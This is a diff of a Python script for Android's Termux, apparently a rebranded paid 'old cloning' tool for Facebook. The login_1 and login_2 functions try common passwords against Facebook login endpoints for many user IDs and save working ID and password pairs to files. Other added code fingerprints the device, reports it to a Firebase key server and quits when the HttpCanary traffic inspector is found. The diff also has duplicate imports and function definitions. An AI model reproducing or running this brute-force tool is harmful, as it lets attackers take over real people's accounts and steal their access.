@@ -14,6 +14,46 @@ from bs4 import BeautifulSoup
 from random import randint as rr
 from concurrent.futures import ThreadPoolExecutor as tred
 from os import system
+from datetime import datetime
+import os
+import time
+import os
+import time
+
+
+
+import os, time
+
+# WhatsApp Channel Section
+channel_link = "https://whatsapp.com/channel/0029VbDD6TJ3GJP51J4rSU0E"
+os.system(f"echo '{channel_link}' | termux-clipboard-set 2>/dev/null")
+print(" \x1b[1;32m[+] WhatsApp Channel Link Copied to Clipboard!")
+print(" \x1b[1;36m[*] Opening WhatsApp Channel...")
+
+# 1. Try opening directly in WhatsApp App using Intent
+wa_cmd = f"am start -a android.intent.action.VIEW -d '{channel_link}' >/dev/null 2>&1 || termux-open-url '{channel_link}'"
+os.system(wa_cmd)
+
+# Exactly 5 seconds wait for WhatsApp
+time.sleep(5)
+# YouTube Channel
+yt_link = "https://www.youtube.com/@ArmanKhan-n4k6j"
+
+print(" \x1b[1;32m[+] Opening YouTube Channel... Please Subscribe!")
+
+# Open YouTube directly
+yt_cmd = f"am start -a android.intent.action.VIEW -d '{yt_link}' >/dev/null 2>&1 || termux-open-url '{yt_link}'"
+os.system(yt_cmd)
+
+
+time.sleep(0.5)
+import os
+import sys
+import time
+import platform
+import urllib.parse
+import random
+import string
 from datetime import datetime, timedelta
 
 # Ensure required modules are installed
@@ -30,12 +70,8 @@ from requests.exceptions import ConnectionError
 requests.urllib3.disable_warnings()
 
 # --- Configuration ---
-FIREBASE_URL = "https://noorsalan-dab42-default-rtdb.firebaseio.com/Noor/"
+FIREBASE_URL = "https://imrankhan-9b815-default-rtdb.firebaseio.com/"
 whatsapp_number = '923202271931'
-
-# WhatsApp Channel Section
-channel_link = "https://whatsapp.com/channel/0029VbDD6TJ3GJP51J4rSU0E"
-os.system(f"echo '{channel_link}' | termux-clipboard-set 2>/dev/null")
 
 def get_device_model():
     try:
@@ -60,18 +96,19 @@ def get_android_version():
         return "Unknown"
 
 def get_hwid():
+    """Generates a permanent Hardware ID tied strictly to the physical device."""
     try:
         android_id = os.popen("settings get secure android_id").read().strip()
         serial = os.popen("getprop ro.serialno").read().strip()
         board = os.popen("getprop ro.board.platform").read().strip()
         device = os.popen("getprop ro.product.device").read().strip()
-
+        
         combined = f"{android_id}_{serial}_{board}_{device}"
         if android_id and android_id != "null" and len(combined) > 10:
             return combined
     except Exception:
         pass
-
+    
     try:
         brand = os.popen("getprop ro.product.brand").read().strip()
         model = os.popen("getprop ro.product.model").read().strip()
@@ -79,8 +116,8 @@ def get_hwid():
             return f"{brand}_{model}_{platform.node()}"
     except Exception:
         pass
-
-    return "HURAIN_DEVICE_" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
+        
+    return "IMH_DEVICE_" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
 
 def get_live_version():
     try:
@@ -107,7 +144,7 @@ def open_whatsapp(customer_name):
     custom_msg = f"PLEASE ALI SIR SEND ME PAID KEY MY NAME IS {customer_name}"
     msg_encoded = urllib.parse.quote(custom_msg)
     wa_url = f"https://wa.me/{whatsapp_number}?text={msg_encoded}"
-
+    
     if platform.system() == "Linux" and os.path.exists("/data/data/com.termux"):
         os.system(f"am start -a android.intent.action.VIEW -d '{wa_url}' > /dev/null 2>&1")
     else:
@@ -139,15 +176,15 @@ def calculate_time_left(expiry_str):
 def display_welcome_banner(user_name, user_key, time_left):
     current_version = get_live_version()
     os.system('clear')
-
+    
     print("\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;96mOWNER      \x1b[38;5;46m▶  \033[1;94mCUTE x HURAIN HURAIN CUTE")
-    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;96mFACEBOOK   \x1b[38;5;46m▶  \033[1;94mHURAIN-TOOL")
-    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;96mWHATSAP    \x1b[38;5;46m▶  \033[1;94m03202271931")
+    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;96mOWNER      \x1b[38;5;46m▶  \033[1;94mALi x IMRAN IMRAN KHAN")
+    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;96mFACEBOOK   \x1b[38;5;46m▶  \033[1;94mIMH-TOOL")
+    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;96mWHATSAP    \x1b[38;5;46m▶  \033[1;94m03052962654")
     print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;96mFEATURE    \x1b[38;5;46m▶  \033[1;94mOLD CLONING")
-    print(f"\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;96mVERSION    \x1b[38;5;46m▶  \033[1;94m13.4")
+    print(f"\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;96mVERSION    \x1b[38;5;46m▶  \033mv13.6")
     print("\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
-
+    
     print(f"\033[1;32m[✓] USER NAME    : {user_name}")
     print(f"[✓] LICENSED KEY : {user_key}")
     print(f"[✓] VALIDITY     : {time_left}\033[0m")
@@ -161,6 +198,7 @@ def hold_screen_10_seconds():
     time.sleep(1)
 
 def check_key():
+    # 1. Maintenance Check
     try:
         for m_node in ["maintenance.json", "maintenance_mode.json"]:
             m_res = requests.get(f"{FIREBASE_URL}{m_node}", timeout=5)
@@ -172,15 +210,16 @@ def check_key():
         pass
 
     saved_key_files = [
-        "/sdcard/.HURAIN_sys_device.id",
-        "/data/data/com.termux/files/home/.HURAIN_key.txt"
+        "/sdcard/.IMH_sys_device.id",
+        "/data/data/com.termux/files/home/.IMH_key.txt"
     ]
-
+    
     user_hwid = get_hwid()
     key_data = None
     user_key = None
     is_valid = False
 
+    # 2. Local files check
     for path in saved_key_files:
         if os.path.exists(path):
             try:
@@ -197,6 +236,7 @@ def check_key():
             res = requests.get(f"{FIREBASE_URL}keys/{user_key}.json", timeout=10)
             key_data = res.json()
             if key_data and isinstance(key_data, dict):
+                # Reject if trial key
                 if key_data.get('is_trial') is True or user_key.startswith("TRL-"):
                     key_data = None
                     user_key = None
@@ -210,6 +250,7 @@ def check_key():
         except Exception:
             pass
 
+    # 3. Firebase HWID search check (Only for non-trial keys)
     if not is_valid:
         try:
             all_keys_res = requests.get(f"{FIREBASE_URL}keys.json", timeout=10)
@@ -217,13 +258,14 @@ def check_key():
             if all_keys_data and isinstance(all_keys_data, dict):
                 for k, v in all_keys_data.items():
                     if isinstance(v, dict) and v.get('hwid') == user_hwid:
+                        # Skip and delete trial keys from Firebase automatically
                         if v.get('is_trial') is True or str(k).startswith("TRL-"):
                             try:
                                 requests.delete(f"{FIREBASE_URL}keys/{k}.json", timeout=3)
                             except Exception:
                                 pass
                             continue
-
+                        
                         user_key = k
                         key_data = v
                         is_valid = True
@@ -237,6 +279,7 @@ def check_key():
         except Exception:
             pass
 
+    # 4. Expiry Check
     if is_valid and key_data:
         expiry_str = key_data.get('expiry')
         if expiry_str and expiry_str != "Lifetime":
@@ -254,12 +297,13 @@ def check_key():
                 user_key = None
                 key_data = None
 
+    # 5. STRICTLY REQUIRE PAID KEY
     if not is_valid:
         for path in saved_key_files:
             if os.path.exists(path):
                 try: os.remove(path)
                 except Exception: pass
-
+            
         os.system('clear')
         print(f"""
 \033[1;33m╔════════════════════════════════════════════╗
@@ -270,10 +314,10 @@ def check_key():
 ║ TO USE THIS TOOL.                          ║
 ╚════════════════════════════════════════════╝\033[0m
 """)
-
+        
         customer_name = input("\033[1;33m[?] Enter Your Name: \033[0m").strip().upper()
         if not customer_name: customer_name = "USER"
-
+            
         print("\n\033[1;32m[•] Opening WhatsApp to request paid key...\033[0m")
         time.sleep(1)
         open_whatsapp(customer_name)
@@ -284,23 +328,23 @@ def check_key():
             key_data = res.json()
             if key_data and isinstance(key_data, dict):
                 saved_hwid = key_data.get('hwid')
-
+                
                 if saved_hwid and saved_hwid not in ("None", "", None) and saved_hwid != user_hwid:
                     print("\n\033[1;31m[×] Key is registered to another device!\033[0m")
                     sys.exit()
-
+                
                 requests.patch(f"{FIREBASE_URL}keys/{user_key}.json", json={
-                    'hwid': user_hwid,
+                    'hwid': user_hwid, 
                     'name': customer_name,
                     'device_model': get_device_model(),
                     'android_version': get_android_version(),
                     'app_version': get_live_version(),
                     'is_trial': False
                 })
-
+                
                 for path in saved_key_files:
                     try:
-                        with open(path, "w") as f:
+                        with open(path, "w") as f: 
                             f.write(user_key)
                     except Exception:
                         pass
@@ -316,6 +360,63 @@ def check_key():
         record_user_daily_usage(user_key)
         return key_data.get("name", "USER"), user_key, key_data.get('expiry')
     return None
+
+if __name__ == '__main__':
+    result = check_key()
+    if result:
+        user_name, user_key, expiry_str = result
+        remaining_time = calculate_time_left(expiry_str)
+        display_welcome_banner(user_name, user_key, remaining_time)
+        hold_screen_10_seconds()
+        print("\033[1;32m[✓] Main Tool Started Successfully!\033[0m")
+
+# Initial setup and promotion
+os.system('clear')
+print(' \x1b[38;5;46mIMH SERVER LOADING....')
+
+os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
+os.system('pip install httpx beautifulsoup4')
+print('loading Modules ...\n')
+os.system('clear')
+
+# --- Anti-tampering and Security Checks ---
+try:
+    api_body = open(api.__file__, 'r').read()
+    models_body = open(models.__file__, 'r').read()
+    session_body = open(sessions.__file__, 'r').read()
+    word_list = ['print', 'lambda', 'zlib.decompress']
+    for word in word_list:
+        if word in api_body or word in models_body or word in session_body:
+            exit()
+except:
+    pass
+
+
+class sec:
+    def __init__(self):
+        self.__module__ = __name__
+        self.__qualname__ = 'sec'
+        paths = [
+            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
+            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
+            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
+        ]
+        for path in paths:
+            if 'print' in open(path, 'r').read():
+                self.fuck()
+        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
+            self.fuck()
+        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
+            self.fuck()
+
+    def fuck(self):
+        print(' \x1b[1;32m Congratulations ! ')
+        self.linex()
+        exit()
+
+    def linex(self):
+        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+
 
 # Global variables
 method = []
@@ -334,6 +435,7 @@ RR = '\x1b[38;5;196m'
 GS = '\x1b[38;5;40m'
 W = '\x1b[1;37m'
 
+
 def windows():
     aV = str(random.choice(range(10, 20)))
     A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
@@ -347,6 +449,7 @@ def windows():
     C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
     D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
     return random.choice([A, B, C, D])
+
 
 def window1():
     aV = str(random.choice(range(10, 20)))
@@ -364,35 +467,44 @@ def window1():
     D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
     return random.choice([A, B, C, D])
 
-sys.stdout.write('\x1b]2;𓆩【CUTE 👑 】𓆪 \x07')
-
+# Set window title
+sys.stdout.write('\x1b]2;𓆩【I M H 👑 】𓆪 \x07')
+# ==========================================
+# 👑 REAL BRANDING BANNER (SCREENSHOT STYLE) 👑
+# ==========================================
 def show_branding():
     if 'win' in sys.platform:
         os.system('cls')
     else:
         os.system('clear')
-
+    
     current_version = get_live_version()
-
+    
     print("""\033[1;32m
-                ██╗  ██╗ ██╗   ██╗ ██████╗  █████╗ ██╗███╗   ██╗
-                ██║  ██║ ██║   ██║ ██╔══██╗██╔══██╗██║████╗  ██║
-                ███████║ ██║   ██║ ██████╔╝███████║██║██╔██╗ ██║
-                ██╔══██║ ██║   ██║ ██╔══██╗██╔══██║██║██║╚██╗██║
-                ██║  ██║ ╚██████╔╝ ██║  ██║██║  ██║██║██║ ╚████║
-                ╚═╝  ╚═╝  ╚═════╝  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
-\033[0m""")
-
+██╗███╗   ███╗██╗  ██╗
+██║████╗ ████║██║  ██║
+██║██╔████╔██║███████║
+██║██║╚██╔╝██║██╔══██║
+██║██║ ╚═╝ ██║██║  ██║
+╚═╝╚═╝     ╚═╝╚═╝  ╚═╝\033[0m""")
+    
     print("\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;95mOWNER      \x1b[38;5;46m▶  \033[1;97mCUTE x HURIAN HURIAN CUTE")
-    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;95mFACEBOOK   \x1b[38;5;46m▶  \033[1;97mHURAIN-TOOL")
-    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;95mWHATSAP    \x1b[38;5;46m▶  \033[1;97m03052962654")
+    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;95mOWNER      \x1b[38;5;46m▶  \033[1;97mIMi x IMRAN IMRAN KHAN")
+    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;95mFACEBOOK   \x1b[38;5;46m▶  \033[1;97mIMH-TOOL")
+    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;95mWHATSAP    \x1b[38;5;46m▶  \033[1;97m03202271931")
     print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;95mFEATURE    \x1b[38;5;46m▶  \033[1;97mOLD CLONING")
-    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;95mVERSION    \x1b[38;5;46m▶  \033[1;97m13.4\"")
+    print(f"\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;95mVERSION    \x1b[38;5;46m▶  \033[1;97mv13.6")
     print("\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
 
 def ____banner____():
     show_branding()
+
+
+# پرانے بینر کو اس نئے طریقے پر سیٹ کر دیا تاکہ نیچے پورا اسکرپٹ خود ہی فکس ہو جائے
+def ____banner____():
+    show_branding()
+
+
 
 def creationyear(uid):
     if len(uid) == 15:
@@ -422,11 +534,14 @@ def creationyear(uid):
     elif len(uid) == 14 and uid.startswith('61'): return '2024'
     else: return ''
 
+
 def clear():
     os.system('clear')
 
+
 def linex():
     print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+
 
 def BNG_71_():
     ____banner____()
@@ -439,6 +554,7 @@ def BNG_71_():
         print(f"\n    {rad}Choose Valid Option... ")
         time.sleep(2)
         BNG_71_()
+
 
 def old_clone():
     ____banner____()
@@ -458,6 +574,7 @@ def old_clone():
     else:
         print(f"\n[×]{rad} Choose Value Option... ")
         BNG_71_()
+
 
 def old_One():
     user = []
@@ -492,6 +609,7 @@ def old_One():
                 print(f"    {rad}[!] INVALID METHOD SELECTED")
                 break
 
+
 def old_Tow():
     user = []
     ____banner____()
@@ -525,6 +643,7 @@ def old_Tow():
             else:
                 print(f"    {rad}[!] INVALID METHOD SELECTED")
                 break
+
 
 def old_Tree():
     user = []
@@ -563,7 +682,7 @@ def login_1(uid):
     global loop
     session = requests.session()
     try:
-        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mHURAIN-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mIMH-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
         sys.stdout.flush()
         for pw in ('123456', '1234567', '12345678', '123456789'):
             data = {
@@ -608,23 +727,23 @@ def login_1(uid):
             }
             res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
             if 'session_key' in res:
-                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mHURAIN\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;97m{creationyear(uid)}")
-                open('/sdcard/HURAIN-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mIMH\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;97m{creationyear(uid)}")
+                open('/sdcard/IMH-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mHURAIN\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;97m{creationyear(uid)}")
-                open('/sdcard/HURAIN-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mIMH\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;97m{creationyear(uid)}")
+                open('/sdcard/IMH-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
         loop += 1
     except Exception:
         time.sleep(5)
 
-def login_2(uid):
-    global loop
-    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mHURAIN-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
 
+def login_2(uid):
+    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mIMH-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+    
     for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
         try:
             with requests.Session() as session:
@@ -641,13 +760,13 @@ def login_2(uid):
                 url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                 po = session.get(url, headers=headers).json()
                 if 'session_key' in str(po):
-                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mHURAIN\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;97m{creationyear(uid)}")
-                    open('/sdcard/HURAIN-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mIMH\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;97m{creationyear(uid)}")
+                    open('/sdcard/IMH-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                     oks.append(uid)
                     break
                 elif 'session_key' in po:
-                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mHURAIN\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;97m{creationyear(uid)}")
-                    open('/sdcard/HURAIN-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mIMH\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;97m{creationyear(uid)}")
+                    open('/sdcard/IMH-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                     oks.append(uid)
                     break
         except Exception as e:
@@ -655,20 +774,6 @@ def login_2(uid):
     loop += 1
 
 if __name__ == '__main__':
-    result = check_key()
-    if result:
-        user_name, user_key, expiry_str = result
-        remaining_time = calculate_time_left(expiry_str)
-        display_welcome_banner(user_name, user_key, remaining_time)
-        hold_screen_10_seconds()
-        
-        # Initial setup and promotion clear sequence
-        os.system('clear')
-        print(' \x1b[38;5;46mHURAIN SERVER LOADING....')
-        os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
-        os.system('pip install httpx beautifulsoup4')
-        print('loading Modules ...\n')
-        os.system('clear')
-        
-        # Finally launch main menu
+# یہاں پہلے کی چیک ہوگی، اگر اپروو ہوگی تو مینو چلے گا، ورنہ اسکرپٹ بند ہو جائے گی
+    if check_key():
         BNG_71_()
